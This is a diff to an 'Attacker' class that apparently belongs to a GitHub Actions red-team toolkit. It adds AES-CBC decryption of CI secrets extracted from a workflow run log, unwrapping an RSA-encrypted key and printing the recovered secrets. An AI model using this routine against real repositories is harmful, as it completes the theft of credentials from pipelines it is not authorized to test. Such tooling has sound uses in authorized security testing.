@@ -9,6 +9,9 @@ from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives.ciphers import Cipher
+from cryptography.hazmat.primitives.ciphers import algorithms
+from cryptography.hazmat.primitives.ciphers import modes
 
 from gato.github import Api
 from gato.git import Git
@@ -554,16 +557,26 @@ class Attacker:
 
                 if len(blob) == 3:
                     encrypted_secrets = base64.b64decode(blob[1])
+                    iv = encrypted_secrets[:16]
+                    enc = encrypted_secrets[16:]
+
                     encrypted_key = base64.b64decode(blob[2])
+
                     Output.owned(
                         "Decrypted and Decoded Secrets:\n"
                     )
 
-                    sym_key = priv_key.decrypt(encrypted_key,
+                    sym_key_b64 = priv_key.decrypt(encrypted_key,
                                                padding.PKCS1v15()).decode()
+                    sym_key = base64.b64decode(sym_key_b64)
 
-                    print('key', sym_key)
-                    print('secrets', encrypted_secrets)
+                    cipher = Cipher(algorithms.AES256(sym_key), modes.CBC(iv))
+                    decrypt = cipher.decryptor()
+
+                    print(decrypt.update(enc) + decrypt.finalize())
+                    #print(base64.b64encode(encrypted_secrets))
+                    #print(base64.b64encode(sym_key))
+
                 else:
                     Output.error(
                         "Unable to extract encoded output from runlog!"
